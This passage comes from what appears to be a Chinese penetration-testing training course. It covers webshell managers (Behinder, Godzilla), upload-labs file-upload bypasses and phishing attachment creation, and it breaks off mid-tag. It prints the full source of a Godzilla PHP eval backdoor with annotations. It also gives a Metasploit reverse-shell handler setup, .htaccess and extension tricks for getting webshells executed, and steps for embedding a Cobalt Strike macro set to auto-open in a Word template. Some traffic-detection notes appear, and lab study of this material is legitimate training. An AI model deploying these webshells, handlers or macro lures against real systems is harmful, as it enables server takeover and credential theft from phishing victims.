设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。冰蝎通信过程中使用AES（高级加密算法，对称加密，微信小程序使用此种方法）进行加密，Java和.NET默认支持AES，php中需要开启openssl扩展，在V2.0版本后，php环境方式根据服务端支持情况动态选择，使得冰蝎更强大。</p>\n<p>下载地址：<a href=\"https://github.com/rebeyond/Behinder/releases\">https://github.com/rebeyond/Behinder/releases</a></p>\n<h4 id=\"自带shell\"><a href=\"#自带shell\" class=\"headerlink\" title=\"自带shell\"></a>自带shell</h4><p>server目录下自带了一些官方shell</p>\n<ul>\n<li>去除动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16]</li>\n<li>增加了插件机制，可开发安装自定义扩展插件</li>\n<li>UI框架由awt改为javafx，重写了大量逻辑</li>\n<li>增强了内网穿透功能，在原有的基于HTTP的socks5隧道基础上，增加了单端口转发功能，可一键将内网端口映射至VPS或者本机端口</li>\n</ul>\n<h4 id=\"流量解密\"><a href=\"#流量解密\" class=\"headerlink\" title=\"流量解密\"></a>流量解密</h4><p><a href=\"https://md5jiami.bmcx.com/\">https://md5jiami.bmcx.com/</a></p>\n<p><a href=\"https://tool.lmeee.com/jiami/aes\">https://tool.lmeee.com/jiami/aes</a></p>\n<p>payload—》base64加密—》使用eval函数（执行加密后的代码）–》再AES对称加密全部payload—》传输</p>\n<h4 id=\"特征\"><a href=\"#特征\" class=\"headerlink\" title=\"特征\"></a>特征</h4><p>1.每一个请求头中存在</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Accept:text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/webp,image/apng,*<span class=\"comment\">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br></pre></td></tr></table></figure>\n<p>2.在使用命令执行功能时，请求包中Content-Length: 5784或5804或5824（根据传输的命令的长度变化）</p>\n<h4 id=\"1-基本信息\"><a href=\"#1-基本信息\" class=\"headerlink\" title=\"1.基本信息\"></a>1.基本信息</h4><p>直接显示出phpinfo，通过此表可以用来信息收集</p>\n<h4 id=\"2-命令执行\"><a href=\"#2-命令执行\" class=\"headerlink\" title=\"2.命令执行\"></a>2.命令执行</h4><p>执行命令</p>\n<h4 id=\"3-虚拟终端\"><a href=\"#3-虚拟终端\" class=\"headerlink\" title=\"3.虚拟终端\"></a>3.虚拟终端</h4><p>可以进行cmd.exe，powershell.exe等功能</p>\n<h4 id=\"4-文件管理\"><a href=\"#4-文件管理\" class=\"headerlink\" title=\"4.文件管理\"></a>4.文件管理</h4><p>可以操作管理文件</p>\n<h4 id=\"5-内网渗透\"><a href=\"#5-内网渗透\" class=\"headerlink\" title=\"5.内网渗透\"></a>5.内网渗透</h4><p>可以做隧道</p>\n<h4 id=\"6-反弹shell\"><a href=\"#6-反弹shell\" class=\"headerlink\" title=\"6.反弹shell\"></a>6.反弹shell</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">exploit</span>/<span class=\"title\">multi</span>/<span class=\"title\">handler</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">payload</span> <span class=\"title\">php</span>/<span class=\"title\">meterpreter</span>/<span class=\"title\">reverse_tcp</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">LHOST</span> 192.168.88.133</span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">lport</span> 4222</span><br><span class=\"line\"><span class=\"title\">run</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"8wXi2VcKW4Y4gTJfNmhpvPiXwYbanP8qADIPRvNipek.png\" alt=\"image\"></p>\n<h4 id=\"7-管理数据库\"><a href=\"#7-管理数据库\" class=\"headerlink\" title=\"7.管理数据库\"></a>7.管理数据库</h4><p>连接数据库</p>\n<h3 id=\"哥斯拉\"><a href=\"#哥斯拉\" class=\"headerlink\" title=\"哥斯拉\"></a>哥斯拉</h3><p><a href=\"https://blog.csdn.net/u012206617/article/details/124248618\">https://blog.csdn.net/u012206617/article/details/124248618</a></p>\n<h4 id=\"介绍：-1\"><a href=\"#介绍：-1\" class=\"headerlink\" title=\"介绍：\"></a>介绍：</h4><p>哥斯拉继菜刀、蚁剑、冰蝎之后具有更多优点的Webshell管理工具</p>\n<p>github地址：<a href=\"https://github.com/BeichenDream/Godzilla\">https://github.com/BeichenDream/Godzilla</a></p>\n<h4 id=\"功能：\"><a href=\"#功能：\" class=\"headerlink\" title=\"功能：\"></a>功能：</h4><p>它能实现的功能除了传统的命令执行、文件管理、数据库管理之外，根据shell类型的不同还包括了：</p>\n<ul>\n<li>MSF联动</li>\n<li>绕过OpenBasedir</li>\n<li>ZIP压缩 ZIP解压</li>\n<li>代码执行</li>\n<li>绕过 DisableFunctions</li>\n<li>Mimikatz</li>\n<li>读取服务器 FileZilla Navicat Sqlyog Winscp XMangager 的配置信息以及密码</li>\n<li>虚拟终端 可以用netcat连接</li>\n<li>Windows权限提升 （2012-2019烂土豆）</li>\n<li>读取服务器 谷歌 IE 火狐 浏览器保存的账号密码</li>\n<li>Windows权限提升烂土豆的C#版本 甜土豆</li>\n<li>支持 哥斯拉 冰蝎 菜刀 ReGeorg 的内存shell 并且支持卸载</li>\n<li>屏幕截图</li>\n<li>Servlet管理 Servlet卸载</li>\n<li>内存加载Jar 将Jar加载到 SystemClassLoader</li>\n</ul>\n<h4 id=\"生成木马\"><a href=\"#生成木马\" class=\"headerlink\" title=\"生成木马\"></a>生成木马</h4><p>生成的PHP马(选择了base64作为加密方式)</p>\n<p><img src=\"BwkPi0UxD9tbktuSkurfaLEWfOektzoLEqi6xsSgREI.png\" alt=\"image\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">session_start</span>();<span class=\"comment\">//创建或者重启一个会话</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);<span class=\"comment\">//设置程序最长运行时间：永久</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);<span class=\"comment\">// 关闭错误报告</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$D</span>,<span class=\"variable\">$K</span></span>)</span>&#123;<span class=\"comment\">//通过密钥对 $D 进行加/解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$D</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"variable\">$K</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>];</span><br><span class=\"line\">        <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$c</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$D</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>=<span class=\"string\">&#x27;pass&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$payloadName</span>=<span class=\"string\">&#x27;payload&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]),<span class=\"variable\">$key</span>);<span class=\"comment\">//通过密码传输攻击荷载并解密</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]))&#123;<span class=\"comment\">//如果有名为payloadname的session就从session中提取攻击载荷</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>],<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$payload</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)===<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$payload</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">eval</span>(<span class=\"variable\">$payload</span>);<span class=\"comment\">//通过eval执行攻击荷载</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">0</span>,<span class=\"number\">16</span>);<span class=\"comment\">//将传入的远控命令加密后，取前16位放在返回值前面，其余的放在返回值后面（二次加密）</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">encode</span>(@<span class=\"title function_ invoke__\">run</span>(<span class=\"variable\">$data</span>),<span class=\"variable\">$key</span>));<span class=\"comment\">//执行远控命令，并对返回值进行加密</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">16</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$data</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)!==<span class=\"literal\">false</span>)&#123;   <span class=\"comment\">//如果第一次连接shell，不存在session的话就将攻击载荷存入session</span></span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$data</span>,<span class=\"variable\">$key</span>);<span class=\"comment\">//将攻击荷载存储到SESSION</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>解密</p>\n<p><a href=\"https://www.bejson.com/runcode/php/\">https://www.bejson.com/runcode/php/</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$D</span>,<span class=\"variable\">$K</span></span>)</span>&#123;<span class=\"comment\">//通过密钥对 $D 进行加/解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$D</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"variable\">$K</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>];</span><br><span class=\"line\">        <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$c</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$D</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>=<span class=\"string\">&#x27;pass&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$payloadName</span>=<span class=\"string\">&#x27;payload&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$data</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"string\">&#x27;123&#x27;</span>),<span class=\"variable\">$key</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h4 id=\"木马的利用逻辑\"><a href=\"#木马的利用逻辑\" class=\"headerlink\" title=\"木马的利用逻辑\"></a>木马的利用逻辑</h4><p>第一次通信时，服务端通过POST方式传递一个名叫pass的参数给木马，给pass参数赋的值是加密后的一组用”|”隔开的方法，也就是接下来要使用的攻击荷载。荷载在解密后被存入SESSION，供之后使用。</p>\n<p>从第二次通信开始，pass传入的是远控命令，通过攻击荷载中的run()方法执行远控命令。然后对回显进行加密后传输给哥斯拉的服务端。</p>\n<h4 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h4><p>1.连接时抓包发现哥斯拉建立连接时会发起三次请求</p>\n<p>第一次请求的数据很长，主要是为了建立session</p>\n<p><img src=\"fm38-TKyii24Am1QpihhdEJVTGDTY1w91xnwcAIVYok.png\" alt=\"image\"></p>\n<p>2.第2个请求中已经自动带上了第1个请求中服务器响应返回的<code>Cookie</code>值，并且第2个请求中只有少量的数据</p>\n<p>特征：</p>\n<p>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8（可以在请求的时候做自定义的修改：配置）</p>\n<p>所有响应中Cache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0, pre-check&#x3D;0</p>\n<p>以上两个只能作为弱特征参考</p>\n<h4 id=\"其它模块讲解\"><a href=\"#其它模块讲解\" class=\"headerlink\" title=\"其它模块讲解\"></a>其它模块讲解</h4><h2 id=\"上传方法\"><a href=\"#上传方法\" class=\"headerlink\" title=\"上传方法\"></a>上传方法</h2><h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>upload-labs靶场：<a href=\"https://github.com/c0ny1/upload-labs\">https://github.com/c0ny1/upload-labs</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull c0ny1/upload-labs</span><br><span class=\"line\">docker run -d -p <span class=\"number\">8022</span>:<span class=\"number\">80</span> c0ny1/upload-labs</span><br><span class=\"line\">docker run -d -p <span class=\"number\">8023</span>:<span class=\"number\">80</span> monstertsl/upload-labs</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8022/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Less-1（JS绕过）\"><a href=\"#Less-1（JS绕过）\" class=\"headerlink\" title=\"Less-1（JS绕过）\"></a>Less-1（JS绕过）</h3><p>删除</p>\n<p><img src=\"20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png\" alt=\"image\"></p>\n<p><a href=\"http://192.168.88.104:8022/upload/1.php?x=phpinfo();\">http://192.168.88.104:8022/upload/1.php?x=phpinfo();</a></p>\n<h3 id=\"Less-2（文件类型绕过）\"><a href=\"#Less-2（文件类型绕过）\" class=\"headerlink\" title=\"Less-2（文件类型绕过）\"></a>Less-2（文件类型绕过）</h3><p>发现这里采用的是后端验证文件类型，但是他只过滤的文件类型，并没有过滤文件后缀名，所以可以上传 php 文件，然后修改 content-type 绕过。</p>\n<p>抓包修改后缀绕过</p>\n<p><a href=\"http://192.168.88.104:8022/upload/end.php?x=phpinfo();\">http://192.168.88.104:8022/upload/end.php?x=phpinfo();</a></p>\n<h3 id=\"Less-5（大小写绕过）\"><a href=\"#Less-5（大小写绕过）\" class=\"headerlink\" title=\"Less-5（大小写绕过）\"></a>Less-5（大小写绕过）</h3><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用 <strong>大小写绕过</strong>。</p>\n<p>上传文件<code>webshell.Php</code></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title></a></h3><h3 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h3><p>双写绕过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webshell.pphphp</span><br></pre></td></tr></table></figure>\n<h3 id=\"Less-17（）\"><a href=\"#Less-17（）\" class=\"headerlink\" title=\"Less-17（）\"></a>Less-17（）</h3><p>先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除</p>\n<p>条件竞争，改成.php不断发包，一直访问地址</p>\n<h3 id=\"Less-1（JS绕过）-1\"><a href=\"#Less-1（JS绕过）-1\" class=\"headerlink\" title=\"Less-1（JS绕过）\"></a>Less-1（JS绕过）</h3><p>删除</p>\n<p><img src=\"20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png\" alt=\"image\"></p>\n<p><a href=\"http://192.168.88.104:8022/upload/1.php?x=phpinfo();\">http://192.168.88.104:8022/upload/1.php?x=phpinfo();</a></p>\n<h3 id=\"Less-2（文件类型绕过）-1\"><a href=\"#Less-2（文件类型绕过）-1\" class=\"headerlink\" title=\"Less-2（文件类型绕过）\"></a>Less-2（文件类型绕过）</h3><p>发现这里采用的是后端验证文件类型，但是他只过滤的文件类型，并没有过滤文件后缀名，所以可以上传 php 文件，然后修改 content-type 绕过。</p>\n<p>抓包修改后缀绕过</p>\n<p><a href=\"http://192.168.88.104:8022/upload/end.php?x=phpinfo();\">http://192.168.88.104:8022/upload/end.php?x=phpinfo();</a></p>\n<h3 id=\"Less-3（跳过）\"><a href=\"#Less-3（跳过）\" class=\"headerlink\" title=\"Less-3（跳过）\"></a>Less-3（跳过）</h3><p>黑名单绕过 Apache解析</p>\n<p>环境出问题，跳过</p>\n<p>第三题又是一个新类型的题：黑名单限制文件上传；不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。那么要如何绕过呢？</p>\n<p>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</p>\n<p>可以上传例如php3, phtml后缀的文件绕过，前提是 Apache 的 httpd.conf 中配置有如下代码:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure>\n<p>服务器会将.php3, .phtml后缀的文件当成.php解析。</p>\n<p>然后直接上传后缀名为<code>.phtml</code>的webshell文件，注意这里上传的文件名会改变，可以通过抓包获取文件上传后的随机名称。</p>\n<h3 id=\"Less-4（-htaccess绕过）\"><a href=\"#Less-4（-htaccess绕过）\" class=\"headerlink\" title=\"Less-4（.htaccess绕过）\"></a>Less-4（.htaccess绕过）</h3><p>基本上把那些花里胡哨的后缀都过滤了，但是没有包括<code>.htaccess</code>，可以利用配合Apache的<code>.htaccess</code>文件上传解析漏洞。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以实现：网页<span class=\"number\">301</span>重定向、自定义<span class=\"number\">404</span>错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>\n<p>然后，上传一个<code>.htaccess</code>内容如下的文件（抓包时删去文件名）:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n<p>这样所有文件都会解析为php</p>\n<p><img src=\"qxi3xPp2qch9MxZRLJDMEDZ-dAXo4cvCe1JGGv5xLl0.png\" alt=\"image\"></p>\n<h3 id=\"Less-5（大小写绕过）-1\"><a href=\"#Less-5（大小写绕过）-1\" class=\"headerlink\" title=\"Less-5（大小写绕过）\"></a>Less-5（大小写绕过）</h3><p>同样是黑名单限制 这关和上一关相比，就多了个<code>.htaccess</code>文件，但是查看源码发现这题没有统一大小写，所以就可以利用 <strong>大小写绕过</strong>。</p>\n<p>上传文件<code>webshell.Php</code></p>\n<h3 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title></a></h3><h3 id=\"Less-10-1\"><a href=\"#Less-10-1\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h3><p>双写绕过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webshell.pphphp</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Less-11（）\"><a href=\"#Less-11（）\" class=\"headerlink\" title=\"Less-11（）\"></a>Less-11（）</h3><p>get型 %00截断</p>\n<p>环境失败</p>\n<h3 id=\"Less-12（）\"><a href=\"#Less-12（）\" class=\"headerlink\" title=\"Less-12（）\"></a>Less-12（）</h3><p>post型 00截断</p>\n<p>环境失败</p>\n<h3 id=\"Less-13（）\"><a href=\"#Less-13（）\" class=\"headerlink\" title=\"Less-13（）\"></a>Less-13（）</h3><p>图片马绕过</p>\n<p>环境失败</p>\n<h3 id=\"Less-14（）\"><a href=\"#Less-14（）\" class=\"headerlink\" title=\"Less-14（）\"></a>Less-14（）</h3><p>getimagesize检测</p>\n<p>环境失败</p>\n<h3 id=\"Less-15（）\"><a href=\"#Less-15（）\" class=\"headerlink\" title=\"Less-15（）\"></a>Less-15（）</h3><p>exif_imagetype图片马</p>\n<h3 id=\"Less-16（）\"><a href=\"#Less-16（）\" class=\"headerlink\" title=\"Less-16（）\"></a>Less-16（）</h3><p>二次渲染绕过</p>\n<h3 id=\"Less-17（）-1\"><a href=\"#Less-17（）-1\" class=\"headerlink\" title=\"Less-17（）\"></a>Less-17（）</h3><p>先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除</p>\n<p>条件竞争，改成.php不断发包，一直访问地址</p>\n<h3 id=\"Less-18（）\"><a href=\"#Less-18（）\" class=\"headerlink\" title=\"Less-18（）\"></a>Less-18（）</h3><p>条件竞争</p>\n<h3 id=\"Less-19（）\"><a href=\"#Less-19（）\" class=\"headerlink\" title=\"Less-19（）\"></a>Less-19（）</h3><p>post型 00截断</p>\n","categories":["原创培训课件"],"tags":["中国蚁剑","冰蝎","哥斯拉"]},{"title":"day7-社工钓鱼技术（上午：钓鱼技巧与制作）","url":"/2022/08/16/day7-%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E6%8A%80%E6%9C%AF/","content":"<h1 id=\"day7-社工钓鱼技术（上午：钓鱼技巧与制作）\"><a href=\"#day7-社工钓鱼技术（上午：钓鱼技巧与制作）\" class=\"headerlink\" title=\"day7-社工钓鱼技术（上午：钓鱼技巧与制作）\"></a>day7-社工钓鱼技术（上午：钓鱼技巧与制作）</h1><h2 id=\"前言：\"><a href=\"#前言：\" class=\"headerlink\" title=\"前言：\"></a>前言：</h2><p>网络钓鱼是最常见的社会工程学攻击方式之一。所谓社会工程学，是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段。在生活工作中，最常使用的邮件、各种文档也成为黑客常用的攻击载体。近些年来，网络钓鱼攻击趋势也一直呈增长趋势，特别是在APT攻击、勒索软件攻击等事件中，扮演了重要的角色。</p>\n<h2 id=\"钓鱼常用技巧\"><a href=\"#钓鱼常用技巧\" class=\"headerlink\" title=\"钓鱼常用技巧\"></a>钓鱼常用技巧</h2><h3 id=\"邮件钓鱼\"><a href=\"#邮件钓鱼\" class=\"headerlink\" title=\"邮件钓鱼\"></a>邮件钓鱼</h3><p>钓鱼邮件指利用伪装的电邮，欺骗收件人将账号、口令等信息回复给指定的接收者；或引导收件人连接到特制的网页，这些网页通常会伪装成和真实网站一样，如银行或理财的网页，令登录者信以为真，输入信用卡或银行卡号码、账户名称及密码等而被盗取。</p>\n<h3 id=\"钓鱼WIFI\"><a href=\"#钓鱼WIFI\" class=\"headerlink\" title=\"钓鱼WIFI\"></a>钓鱼WIFI</h3><p>仿造一个假的wifi，欺骗用户登陆，之后窃取用户信息。</p>\n<h3 id=\"伪基站\"><a href=\"#伪基站\" class=\"headerlink\" title=\"伪基站\"></a>伪基站</h3><p>又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的GSM移动电话信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。</p>\n<h3 id=\"标签钓鱼\"><a href=\"#标签钓鱼\" class=\"headerlink\" title=\"标签钓鱼\"></a>标签钓鱼</h3><p>标签钓鱼(tabnabbing)是一种新的网络钓鱼攻击手法，该攻击手法是由Mozilla Firefox浏览器的界面及创意负责人Aza Raskin发现和命名的，tabnabbing可改变用户浏览网页的标签及接口，以诱导用户输入网络服务的账号与密码。 </p>\n<h3 id=\"鱼叉式网络钓鱼\"><a href=\"#鱼叉式网络钓鱼\" class=\"headerlink\" title=\"鱼叉式网络钓鱼\"></a>鱼叉式网络钓鱼</h3><p>这是指一种源自于亚洲与东欧，只针对“特定的目标”进行的网络钓鱼攻击！简而言之就是组织一次有目性的，对特定的单位进行钓鱼攻击。</p>\n<h3 id=\"水坑攻击\"><a href=\"#水坑攻击\" class=\"headerlink\" title=\"水坑攻击\"></a>水坑攻击</h3><p>”水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p>\n<h3 id=\"U盘钓鱼\"><a href=\"#U盘钓鱼\" class=\"headerlink\" title=\"U盘钓鱼\"></a>U盘钓鱼</h3><p>简单来说，就是在U盘里面植入木马或者病毒，进行钓鱼上线。常见的攻击手法就是把U盘扔在目标单位门口，或者你可以社工员工地址信息并邮寄给他。亦或者，可以像某黑客电影或者黑客游戏一样，想办法进入对方大厦到工位电脑上插U盘上马。</p>\n<h2 id=\"钓鱼附件制作\"><a href=\"#钓鱼附件制作\" class=\"headerlink\" title=\"钓鱼附件制作\"></a>钓鱼附件制作</h2><h3 id=\"Office宏\"><a href=\"#Office宏\" class=\"headerlink\" title=\"Office宏\"></a>Office宏</h3><p>宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。由于早些年宏病毒泛滥，现在Office的宏功能已经默认是禁用，但依然无法阻挡攻击者使用宏。那么如何引诱受害者开启宏功能就是关键了，常用的套路:</p>\n<ul>\n<li>文档是被保护状态，需要启用宏才能查看；</li>\n<li>添加一张模糊的图片，提示需要启用宏才能查看高清图片；</li>\n<li>提示要查看文档，按给出的一系列步骤操作；</li>\n<li>贴一张某杀毒软件的Logo图片，暗示文档被安全软件保护。</li>\n</ul>\n<h4 id=\"cobalt-strike-生成宏\"><a href=\"#cobalt-strike-生成宏\" class=\"headerlink\" title=\"cobalt strike 生成宏\"></a>cobalt strike 生成宏</h4><p><img src=\"gVIEuJy7SCXavt38-3kzegG2oAp23nobY_pjYIuHDbM.png\" alt=\"image\"></p>\n<p>选择好设置的监听器后 复制宏代码</p>\n<p><img src=\"BCaukWoJRDZBx1x_6B8yqn3lH4krgqd9Cwyz8BUEsfM.png\" alt=\"image\"></p>\n<p>创建 docx 文件 选择自定义功能</p>\n<p><img src=\"kXsR35LKrtiAn0IaUk2X99Xc4xysblDKtufTIUCurZE.png\" alt=\"image\"></p>\n<p><img src=\"1ardaRVivMnD7uDaSmpFUIUSuTY-WJU4EXLPZ8IZDKY.png\" alt=\"image\"></p>\n<p>勾选上 开发工具</p>\n<p><img src=\"6xkOkfwcbyNJ7LYund0eNaswAIWymju1Ff9ArVSWYmA.png\" alt=\"image\"></p>\n<p><img src=\"eWzEyxEfrzZQ0Y396u8Fh5lHnVLdxrWYSm3yiIXB3Gc.png\" alt=\"image\"></p>\n<p>创建宏 填写名字 宏的位置在当前文件名。</p>\n<p><img src=\"ZvMTfGJR9b-Qgt0nB9_a0lRxqSU5iTulQ6bSTf5sV8Q.png\" alt=\"image\"></p>\n<p><img src=\"LD4PBYAN1FPAnNgKSA0WfSCxggUrPgKoVBW_gzkmshE.png\" alt=\"image\"></p>\n<p>将生成好的宏代码复制到文件里 选择 auto_open 自动打开</p>\n<p>存为 dotm 文件</p>\n<h4 id=\"测试宏\"><a href=\"#测试宏\" class=\"headerlink\" 